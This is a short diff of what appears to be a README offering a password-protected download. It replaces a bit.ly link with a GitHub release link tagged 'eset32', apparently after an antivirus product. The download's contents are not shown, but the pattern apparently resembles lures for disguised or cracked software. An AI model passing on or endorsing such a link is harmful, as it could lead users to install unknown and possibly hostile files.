@@ -2,4 +2,4 @@
 
 PASSWORD - github
 
-[DOWNLOAD](https://bit.ly/44pEfiV) 
+[DOWNLOAD](https://github.com/magiclztq/eset32/releases/tag/eset32) 
